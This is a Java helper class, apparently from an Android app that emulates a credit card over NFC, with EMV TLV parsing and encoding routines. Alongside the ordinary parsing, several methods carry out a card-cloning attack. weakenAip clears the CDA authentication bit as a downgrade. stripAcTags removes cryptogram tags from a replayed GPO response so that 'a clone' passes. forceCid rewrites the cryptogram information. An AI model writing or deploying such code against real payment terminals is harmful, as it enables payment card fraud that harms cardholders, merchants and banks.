package de.androidcrypto.android_hce_emulate_a_creditcard;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.TreeSet;

/**
 * Pure EMV byte plumbing.
 *
 * NOTHING in this class may touch an Android type. That is the whole point: the
 * service extends HostApduService, so a test that instantiates the service drags
 * in the Android runtime and needs an emulator or returnDefaultValues. Every
 * method here runs in plain JUnit in milliseconds instead.
 *
 * The service is the only caller, and it holds no copies of these - two
 * implementations of the same TLV walk is how they drift apart.
 */
final class Emv {

    private Emv() { }

    /** Tags a GPO replay may carry but a clone must strip. See the service. */
    static final int[] AC_TAGS = {0x9F26, 0x9F27, 0x9F36, 0x9F10, 0x9F71};

    static byte[] hex(String s) { return Hex.hex(s); }

    static String toHex(byte[] d) { return Hex.toHex(d); }

    /**
     * TLV writer with a real length encoder.
     *
     * FIX: a one-byte length is wrong above 127 bytes, and patchFci() wraps a
     * whole captured FCI. A wrong outer length on the FCI is exactly "the
     * terminal read the app then stopped".
     */
    static byte[] tlv(int tag, byte[] v) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        if ((tag & 0xFF00) != 0) {
            o.write((tag >> 8) & 0xFF);
            o.write(tag & 0xFF);
        } else {
            o.write(tag & 0xFF);
        }
        int n = v.length;
        if (n < 0x80) {
            o.write(n);
        } else if (n <= 0xFF) {
            o.write(0x81);
            o.write(n);
        } else if (n <= 0xFFFF) {
            o.write(0x82);
            o.write((n >> 8) & 0xFF);
            o.write(n & 0xFF);
        } else {
            o.write(0x83);
            o.write((n >> 16) & 0xFF);
            o.write((n >> 8) & 0xFF);
            o.write(n & 0xFF);
        }
        o.write(v, 0, n);
        return o.toByteArray();
    }

    static int readTag(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int t = b[pos[0]++] & 0xFF;
        if ((t & 0x1F) == 0x1F) {
            if (pos[0] >= b.length) return t;
            t = (t << 8) | (b[pos[0]++] & 0xFF);
            while (pos[0] < b.length && (b[pos[0] - 1] & 0x80) != 0) {
                t = (t << 8) | (b[pos[0]++] & 0xFF);
            }
        }
        return t;
    }

    static int readLen(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int l = b[pos[0]++] & 0xFF;
        if ((l & 0x80) != 0) {
            int n = l & 0x7F, v = 0;
            for (int k = 0; k < n && pos[0] < b.length; k++) {
                v = (v << 8) | (b[pos[0]++] & 0xFF);
            }
            return v;
        }
        return l;
    }

    /**
     * Lc of an incoming APDU, extended length included.
     *
     * FIX: reading apdu[4] as a plain Lc gives 0 for an extended APDU. Both
     * consequences were silent: a long SELECT took the empty-name path and
     * selected the card's own AID, and a long GENERATE AC MACed an empty CDOL.
     */
    static int lcOf(byte[] apdu) {
        if (apdu.length < 5) return 0;
        int lc = apdu[4] & 0xFF;
        if (lc != 0x00) return lc;
        if (apdu.length < 7) return 0;
        return ((apdu[5] & 0xFF) << 8) | (apdu[6] & 0xFF);
    }

    static int dataOff(byte[] apdu) {
        return (apdu.length >= 7 && (apdu[4] & 0xFF) == 0x00) ? 7 : 5;
    }

    /**
     * Clear the CDA bit in the AIP of a GPO template, in place.
     *
     * FIX: format 1 (outer 80) has NO inner TLVs - the payload is two raw AIP
     * bytes then the track 2. The old TLV walk found no 82, returned, and left
     * CDA set in MSD mode.
     */
    static void weakenAip(byte[] tpl) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        readLen(tpl, pos);

        if (outer == 0x80) {
            if (pos[0] + 2 <= tpl.length) tpl[pos[0]] &= (byte) ~0x01;
            return;
        }

        int i = pos[0];
        while (i < tpl.length) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) return;
            if (t == 0x82 && l >= 1) {
                tpl[q[0]] &= (byte) ~0x01;
                return;
            }
            i = q[0] + l;
        }
    }

    /** Overwrite the CID in a GPO template in place, or append one. */
    static byte[] forceCid(byte[] tpl, byte cid) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        int olen  = readLen(tpl, pos);
        int end   = Math.min(tpl.length, pos[0] + olen);

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == 0x9F27 && l >= 1) {
                tpl[q[0]] = cid;
                return tpl;
            }
            i = q[0] + l;
        }

        byte[] content = Arrays.copyOfRange(tpl, pos[0], Math.min(tpl.length, pos[0] + olen));
        return tlv(outer, concat(content, tlv(0x9F27, new byte[]{cid})));
    }

    /**
     * Rebuild a GPO template without AC_TAGS, forcing the terminal to ask for a
     * cryptogram.
     *
     * FIX: format 1 is not a template of TLVs. The AIP is copied verbatim and
     * only what follows is walked. The old version walked from the AIP: on this
     * card AIP 0800 read as tag 08 length 00 and landed correctly by accident,
     * but any non-zero second byte ate that many bytes of track 2.
     */
    static byte[] stripAcTags(byte[] tpl) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        int olen  = readLen(tpl, pos);
        int end   = Math.min(tpl.length, pos[0] + olen);

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        if (outer == 0x80) {
            if (end - pos[0] < 2) return tpl;
            out.write(tpl, pos[0], 2);
            pos[0] += 2;
        }

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            i = q[0] + l;

            boolean drop = false;
            for (int d : AC_TAGS) if (d == t) { drop = true; break; }
            if (drop) continue;

            byte[] one = tlv(t, Arrays.copyOfRange(tpl, q[0], q[0] + l));
            out.write(one, 0, one.length);
        }
        return tlv(outer, out.toByteArray());
    }

    /** First value of {@code want} inside a template, or null. Null for format 1. */
    static byte[] findTag(byte[] tpl, int want) {
        if (tpl == null || tpl.length < 4) return null;
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        if (outer == 0x80) return null;
        int olen = readLen(tpl, pos);
        int end  = Math.min(tpl.length, pos[0] + olen);

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == want) return Arrays.copyOfRange(tpl, q[0], q[0] + l);
            i = q[0] + l;
        }
        return null;
    }

    /**
     * FIX: the format 1 branch used raw[2] and raw[3], right only for a
     * short-form length. A long-form payload put the AIP two bytes further on.
     */
    static byte[] capturedAip(byte[] raw) {
        if (raw == null || raw.length < 4) return null;
        int[] pos = new int[1];
        int outer = readTag(raw, pos);
        if (outer == 0x80) {
            int l = readLen(raw, pos);
            if (l >= 2 && pos[0] + 2 <= raw.length) {
                return Arrays.copyOfRange(raw, pos[0], pos[0] + 2);
            }
            return null;
        }
        int len = readLen(raw, pos);
        int end = Math.min(raw.length, pos[0] + len);
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(raw, q);
            int l = readLen(raw, q);
            if (q[0] + l > raw.length) break;
            if (t == 0x82 && l >= 2) return Arrays.copyOfRange(raw, q[0], q[0] + 2);
            i = q[0] + l;
        }
        return null;
    }

    static byte[] concat(byte[]... arrs) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        for (byte[] a : arrs) if (a != null) o.write(a, 0, a.length);
        return o.toByteArray();
    }

    /**
     * Build an AFL from {sfi, record} pairs.
     *
     * Contiguous records collapse into one entry; a gap starts a new one. Get
     * this wrong and the terminal reads a record that does not exist and gets
     * 6A83.
     */
    static byte[] afl(List<int[]> records) {
        TreeMap<Integer, TreeSet<Integer>> map = new TreeMap<>();
        for (int[] r : records) {
            TreeSet<Integer> set = map.get(r[0]);
            if (set == null) { set = new TreeSet<>(); map.put(r[0], set); }
            set.add(r[1]);
        }

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (Map.Entry<Integer, TreeSet<Integer>> e : map.entrySet()) {
            int sfi = e.getKey();
            int runStart = -1, prev = -1;
            for (int rec : e.getValue()) {
                if (runStart < 0) {
                    runStart = rec;
                } else if (rec != prev + 1) {
                    aflEntry(out, sfi, runStart, prev);
                    runStart = rec;
                }
                prev = rec;
            }
            if (runStart >= 0) aflEntry(out, sfi, runStart, prev);
        }
        return out.toByteArray();
    }

    private static void aflEntry(ByteArrayOutputStream out, int sfi, int first, int last) {
        out.write((sfi << 3) & 0xFF);
        out.write(first & 0xFF);
        out.write(last & 0xFF);
        out.write(0x00);
    }
}
